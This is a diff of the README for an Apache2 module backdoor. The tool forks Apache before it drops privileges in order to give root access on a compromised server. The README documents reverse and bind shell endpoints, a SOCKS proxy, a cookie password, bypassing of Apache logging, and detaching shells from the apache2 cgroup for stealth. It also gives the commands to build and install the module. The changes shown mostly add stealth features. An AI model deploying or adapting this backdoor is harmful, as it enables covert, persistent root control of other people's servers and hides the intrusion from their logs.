@@ -2,12 +2,13 @@
 Apache2 Module Backdoor is a stealth backdoor using an Apache2 module.<br/>
 The main idea is to fork() the main Apache2 process just after it has readed its config.
 Since it's forked before the root user transfer the process to www-data, you can execute command as root.<br/>
-
+The challenge was to never let die this forked root apache2 process, to let us interact as root with 
+the compromised system.
 
 # Features
 
 * Bind TTY Shell
-* Reverse Shell (TTY ,PHP, Perl, Python, Ruby)
+* Reverse Shell (TTY , native, PHP, Perl, Python, Ruby)
 * High stability and reliability, each shell spawns a new forked independent root process attached to PID 1
 * Socks proxy (Socks5 code from https://github.com/fgssfgss/socks_proxy)
 * Password Protection through cookie headers
@@ -21,11 +22,15 @@ There is also a hook to bypass the Apache2 logging mechanism. Each request to th
 
 # Description
 
-The password is passed through Cookie headers: `Cookie: password=backdoor`. You could easily edit it:
-there are some constants in the beginning of `mod_backdoor.c`. <br/>
+The password is passed through Cookie headers: `Cookie: password=backdoor`. It's defined with `#define` 
+in the beginning of mod_backdoor.c, so you could edit it easily.<br/>
+
 Each following requests must contain this password to interact with the module.<br/>
 Each request containing this cookie will not be logged by Apache if the module is running. <br/>
-Each shell spawns in its own process, attached to PID 1, so you could spawn many shells. <br/>
+<br/>
+Each shell spawns in its own process, attached to PID 1 and removed from apache2 cgroup.
+ It means it's possible to restart/stop apache2.service from a spawned shell. It also improves stealth, shells
+ are no longer related to apache2.service. <br/>
 
 ### Bind TTY Shell
 The endpoint  `http[s]://<TARGET>/bind/<PORT>` bind a listening port on `<TARGET>:<PORT>` <br/>
@@ -40,7 +45,7 @@ shell to `<IP>:<PORT>` <br/>
 
 ### Reverse Shell (No TTY)
 The endpoint `http[s]://<TARGET>/reverse/<IP>/<PORT>/<PROG>` returns a shell to `<IP>:<PORT>` <br/>
-`<PROG>` must be one of this: <br/>
+`<PROG>` must be one of these: <br/>
 
 | Native   | External  |    
 | :------: | :--------:|
@@ -59,7 +64,7 @@ Ruby isn't using `/bin/sh`.
 The endpoint `http[s]://<TARGET>/ping` tell you if the module is currently working.
 
 # Notes
-You could easily edit the differents endpoints and the password. It is defined by constants 
+You could easily edit the different endpoints and the password. It is defined by constants 
 at the beginning of `mod_backdoor.c`.<br/>
 Apache2 Module Backdoor is inspired from Ringbuilder, created by Juan Manuel Fernandez ([@TheXC3LL](https://twitter.com/TheXC3LL))<br/>
 More info about Ringbuilder:<br/>
@@ -69,7 +74,7 @@ https://www.tarlogic.com/en/blog/backdoors-modulos-apache/ <br/>
 Socks5 code was adapted from https://github.com/fgssfgss/socks_proxy <br/>
 
 # Builds
-For developpement :<br/>
+For development :<br/>
 * `apxs -i -a -c mod_backdoor.c -Wl,-lutil` <br/>
  -Wl,-lutil used to link mod_backdoor.so with libutil.so to use forkpty() from <pty.h>
 * `systemctl restart apache2`
